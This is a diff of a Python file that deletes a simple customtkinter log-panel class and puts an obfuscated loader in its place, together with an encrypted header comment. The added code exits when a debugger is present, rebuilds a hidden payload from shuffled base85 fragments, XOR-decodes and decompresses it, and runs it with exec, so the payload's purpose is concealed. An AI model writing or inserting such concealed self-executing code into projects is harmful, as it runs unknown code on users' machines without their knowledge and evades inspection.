@@ -1,30 +1,10 @@
-import customtkinter as ctk
-
-
-class LogFrame(ctk.CTkFrame):
-    def __init__(self, master, **kwargs):
-        super().__init__(master, **kwargs)
-
-        top = ctk.CTkFrame(self, fg_color="transparent")
-        top.pack(fill="x", padx=8, pady=(6, 2))
-
-        self.lbl_hapus = ctk.CTkLabel(top, text="Hapus log", text_color="red",
-                                       font=ctk.CTkFont(size=13), cursor="hand2")
-        self.lbl_hapus.pack(side="right")
-        self.lbl_hapus.bind("<Button-1>", lambda e: self._hapus_log())
-
-        self.textbox = ctk.CTkTextbox(self, height=120, state="disabled",
-                                       font=ctk.CTkFont(family="Courier", size=13))
-        self.textbox.pack(fill="both", expand=True, padx=8, pady=(2, 8))
-
-    def log(self, pesan):
-        self.textbox.configure(state="normal")
-        self.textbox.insert("end", f"{pesan}\n")
-        self.textbox.configure(state="disabled")
-        self.textbox.see("end")
-
-
-    def _hapus_log(self):
-        self.textbox.configure(state="normal")
-        self.textbox.delete("1.0", "end")
-        self.textbox.configure(state="disabled")
+# PT_REV:eyJ2IjoxLCJzYWx0IjoiUVRjWVpHdEVjcFdsbXZvM3RJOUxwZz09IiwiY2lwaGVyIjoicmZIQXBxUGZYVUR3SlZaYnZqSFc0b0JHTVdhNHNnSSt4QnJXZzZ6aW1COTB6SHVoR2tqOHlUbkdQV1EzU0ZjS1QwUzI3NjZhSEczU3BSYWo0d0R0VmpvMjB0cDRUY2d3QXBIR2Z3VzFwbkJITVl1eEp6Sk0yYmpMN3dSMituNkhjck5md3ZkNjV4RHJYeVIrOGM4WXFvakVuYXlTTDVCeGdqQThINlg4QVloNEhBbkxKRmczQVZWNE5KZXJpVndtblJ1cW5sUWlpVXN0alIzSkh1b3ZsVmljZkdIWStwK1JvV0o1SlhwdEM2TjhVckRHTnVMSU51ZkFtT1EwQ1hadVcvbHZ6TGpkUFV0dW5xMXdlQm5jSEYzUEFqcWIrOHJnMFlxME95MHViYnpXTWZ0THpvckZHRVdTZk9pdmcvUVpkRWpUdnVrd3RJQ3VtWnMzeTJFT2RrT294aHdLT1V0cFlUWmtEVHpTRXovTGx3SXlFZmcxMEhmZGhZcWZCODZXWDM2WlNtWVhOK3ZFTEhhVWY5NzN2bzlsWjg1NDZJQWZWZ1BuU3JQZmVlUitaTlJKa0h5SktmLzVPdUhpU01hY3h3OElmZFNKS0ZVc0l1d0xITGxSSVVzbGJDcWRBNWQvYTJoYlJBNFlzSm5jc29ON2swN1dKaUpqeVNFR0NadDBSZG1FazhVWkd6NmhoUGgvbGVzUEs0eE9XTkgyUUJBemo3Q0pRSStGdUprRkhmY3RvUDRJQWE5d1krQTlGZGg1SjBBTmZNY0xBQXJ6ZGNVMUJsN3Z4L2sycWdpeHdGaDdhb05lblBzRXAxT29XdnVuaGhHdWZ5SmhkczB0YWh6TnB1UEQyVllJb1AzcHZFRko4ZjRuMFFmdERZUFhNdFJaNWVMMHo0bndPcGIzcWE2ZEhFNlNGL0llK0I4dkRKVWlSNXlUU3NFZXMzN2x6cGRGbFBWRTBOeVZPWnZzTGJ0eTVQTjhtcjdQbnhBWXBvbFF2eXNvQm5ndlN0VGlVTDdxOWkvZ0FzYmxIemVBd01RTWpJSFJQelZsTkY4cFNUUGcrNjkyNDdPMnRpMkdkNm1mZEdPdVhRTE5TOWdoV3J2TllhVCtxNyt5TmM5WmNSMitRTkROZU1vUm1yNk9ZWSs3NmtjcS9wNVVndnJqZkVxUnlRMWtxd3pXaTVNeXkwakZvMWFpZkIxeUJRSnBqZVdKVHF6ODRjM2NzLzNrK2hZdkZrV2Y4b2FFVGZDdkgwa2UxMENWQUZuR3hVOThKOVRncUd3bTA0em9nUXB3YUpkT1R2MUFGbDZaeHg1dnZjV3pTc21Gd2J0clRVRWkzNUY2T2FIT0U3WS9RSWhqWEs3M2lvMHJFWm5zQ0pNUU1tVVhGamplNHVKVDk4SEJxMDRlVWttM3R3L0JJbWQ1eXVZZHhTSkpBTyttUVRRNjU5aUg4UzBwb0xoK2d5MEpMcmdncy9RQzlxZVlVTGJTcXFRMXFvRVBqcFY3em9CSUExOFhVSUFOYzNJaWVGc1N2YWNueDRzSUhjdklGTWNUVk1GTWdqbThkMEVQS2R4VHRGYmlXeEc4aHRpcTJJZDFkc0ljNTBxNDR0RXZZSEg5SkFOQTZBMEsyQjZDbW1PNnEvVmZGb2hFWGl2RjBkZmRsN29lcXJuVVBSaFU3WXpXbUVxOTlvMWFoZ0dLU2JHeGpOWFgrT3Roa201QWhtR1lBckJ4VGZ1TDJBdDk2UFdjZk16SmJwUnNJT0ZlaHQ5R3NTNFRkdHlpbzVpNnpOWjdsejJaZnIrSmpLZnRtYnpwQXdaNnZuN3ZJZ1QxdHBkV3FYQ2lmZDNDNnEvZy9qNEdQK1V2RGJsRHV6U2RHbjM4MEZydE9BR3JhTnNYeDdkc3VJOHRqYlpITVhCVldvMm03eTB5aTl5bDkyK00wekRBeDh5QWVnZVJtWEV3SEFHRnYrNUdzU0o4YTFqMS9ZbmlQbTdMZldpUmpxUEt4ZzhMQnRoZiIsInRhZyI6IjI5YjU3M2JlOWQ1MjE0ZjkwZjJhYjE4MmI0NDc1ODdiZTY5NmU3MGNmZTYwZDM4MDRlZGVkNjc2ZTUwZmQ5N2YifQ==
+import sys as _0
+if getattr(_0,'gettrace')():raise SystemExit
+_1=__import__;_2=_1('builtins');_3=_1('base64');_4=_1('zlib');_5=_1('marshal')
+_6=[(3, 'Qbj$zqmJ-ZAeM&ziI=P}N4Qh+T{_Jmjm*oL{T8TZ4+@U#@!`7aZ*D6ETiPGS(*pnkWY6QsNGd'), (10, 'K$?to0)D8Eq4(#8x;Is<TdGOkOfH7MBL$Fpc7!_KoLvQKx)V=4=K?6gv!n$%8<<CT0kTr6=Xi'), (17, '6(9ikjoTW+VDn>{znHqnyabCtTA~L1eQ|w#|R^W?~hm#+8js>nZDjLUY3wO!-H9rlA6_H-zon'), (24, '_{3zkmn9yWzx-CCyjj%_n-uxT`X)U$S4jKs`It_C#AkfH@{$7X(o-7zyB*MF1XcfCT31Ulgwg'), (31, 'rGTgw?!!hkVKE+Njx4RH0Z!_W-p}bOMe8sa!p!4fv9Y;))VB-EP{auZYTyw1tgC$+zIk5zE#C'), (38, 'Xaiu7DH{KnE&zSS<KE*_GQw$}9oh6EF{G`VD+nrZ-TH4OttC{9Q`Fwn2rEnDJ*FN*_hS=B-HB'), (45, 'XMyzO<NFqsw-W*$rR6BhI0QJ>vx?_IzQIl*-H0oPNt~Pim`UDlu}&8s8D<D08M<i=vDM`)9_Q'), (52, 'CJry8)j6LX6PInoxK$T!2j5f<8cxTs%n91IxMz78OynM7U*-dlWlP)3Ep?#uKI$*2R#p4RtoM'), (59, '8R3jbb8-N0Gvhz!@CUu{N?qXWW1t9g?PDkoyTmKP}wNYkK^+54e+xhAcq{yH1~ci9NWwu4Zuc'), (66, '^dOqo`M$kqnFYd8OJi(}lb8Ri=wR@8i?WKFkdTaPzd8~^0VpQJ7V5;b(83ssqvQM`vU;GqkoW'), (73, 'h2YQ|qHZjTB5l*y&G2fmEHp0eFCx|0u_#CreEJba_VXP~R(Yg}|zKCBQw3XDSs*r74UCZTP|i'), (80, 'qKC1rr1iB4epE)h|nV*fPIrA#Xd}3OZ1V!s<uX8y~s`UBEx1|XFxvuTEr2-Y(i9@pFHXKkyT>'), (87, 'mPI<<vT1A4E$lf;5uZhKh1dJS#{FAr+gvPTdww(}UvmFOV?)>?sJW2k3*^G54r!iaBya2WBpP'), (94, '+vcD*R#07NbDv+9wS9#D9JM-yrd`Tnekx2rV5vP&J6_*r$hR^(q3643N>&tgMbC_QKfRP49t9'), (101, '`6Vqi&VV6e$9T~Hj~m>^ja1FVES&RFgLbuklU$8y2QxEYN{Ai>Fu`@owl5^q5@f%W3mt$=_Hn'), (108, 'I@kYG<P4O{LAfOy^Xd5@4I#v^tg6nE{3$EfJ}gpw<PMupY!=@PHuzd>-3Ba6<*6m3o(ISK1k('), (115, 'SDgbbV$T+Bo#8&jdV^yLYHzL<H#|}**rr}ZW<#C`yn#KBTFLG`ut*Me3{S74Ego#e47U>gV8!'), (122, 'I*=ac9&+nu9hWs7VWr6W!fWDL$3ofuhu-xmvkA(J)aw$Yklci!L5K>|l{$Jjz1fdZ;d}za^&B'), (129, 'J2{^0fn<Wgs*e02<zCgXPOxiHi?)hMvWurt>`kapNqW3>1H!9M+w)g*@=}L)+tDo%;HZFYG4|'), (136, 'rwL4DwQ|2<z^#?3lA3thXqm?nL3OR(6x#S6RS%EXK>gjcAAaZjXg+_agd{hB|{iM0!Wa>eAV;'), (143, '+cn%P0CEiQ2(?!W}_<Mh)#_VG|90bqrHjK_qk(-47%(>lI4SaGQ<zE{9BmQsjU<)eYh#{aeB|'), (150, 'qhVTzsB=EtNNc5+NsQskQ#D5d^10ujn%%F;1rdIo8Y}RKa%yMRaE;Ye8Z3v>5;F3%85t4Oj>t'), (157, '!oE=M<F!72%KZ-)(d+L~I4ftbfqw|<k4kcAlVeXa66L1C3S_!mPACAQg5%_aq0|pysB7&^+52'), (164, 'KpRE-pBTRC%$(H+7lob_=WKGpm>}vEl;R9aj=)cJ3DUmzhI0os7qYiR76BBrO_n#h>gGu&!ag'), (171, 'MNC0?_6;rKKHB@r(@Mw>_VcxSh^hD-(+#(hHO#if<g_$iZ|aE%!2_o0@v91~j6DTyWFVk;Ei1'), (178, 'r)jNWPkxT>gvX%i5naw>!6$qnlE!S|bSw8p0C@XZ(3htR;KF@R3re-;;7W{7-lEwfDGK=W0Ok'), (185, '5B@%^q7sja;kBHqbjr2ws-DG;Pst-2u(YyVUC>VHj!@yTUF5EO7f|2i(sRnVK*&PlnrrQzP~7'), (192, 'Qv@J@WK-QXjlR)_JI~<+KLt7URnTM~Uwl3g(AZVKQ&w*!f>Wq!%{pr=0O^@}9{&T*YJHU7X6R'), (199, '$9EJZE&<A{$&EPR&#|)fRe+$jA{UUa+DdY%ucP6@{Pypi`t%k!@SIS^X@oN8E7D+4Ao8RhkLQ'), (206, 'k^wkSoTSYMY>7YmSp(N+DSDOf9Eji!=rg*G=6|%w8gJaSK9W!wARX;aUZpGgga*N0{`rH<!)0'), (213, '<x_X;T5-yco!-o|TTVYVvBu6>dcjdgYv4#WfM=kU`ta|X}lvt!YXe)8}&1DyH7Tk#?}iA_k3$'), (220, 'B%68Ikf)E7ZDVYyiw(oNM@=6#9b{l$eu@_^|>!(+bxS!Hvw?lf*~`d_yNW(I%Jg`?xz<$d%@U'), (227, 'wJG@`Pxp_J#%vrg*Jm%o~JIbvgOi@|Fub$w4Z@|IRyP)NNDG-_0v_gtot>`%Pa<Cz)Ho*)khP'), (234, '$pN;1py3BcE1wldLQGY&SR1NLf`x{dJ0|b0q7I(u8Dp2`X-O;*c(P*odeL8>SYK?cjol&*{Kr'), (241, '@uNtJz3{C?ku(L_N{nW}xbUNiGs-$u`M+aj54&Res0CQg9jZVgyp(79-p?Y>DLU;FUJX2#toT'), (248, '*Zm`m?XE+#sQ-b7Kc#u8S7zNN}r<GpeIxYyaB>i;=nEQ8h8-kH}5xLXtmZCp7TMPT<){2{TkD'), (255, 'd9CS?#Ywgpr<PG=}DPv&mOrOwKf~7EZ37}m)8-I*|tMdYO=3^84K}TZA*pMD~s%#^')]
+_7=''.join(_9 for _8,_9 in sorted(_6,key=lambda _a:_a[0]))[::-1]
+_k=[141, 220, 203, 171, 84, 42, 192, 254, 120, 64, 229, 145, 252, 71, 166, 157, 248]
+_d=bytearray(_3.b85decode(_7))
+for _i in range(len(_d)):_d[_i]^=_k[_i%len(_k)]
+getattr(_2,'exec')(_5.loads(_4.decompress(bytes(_d))))
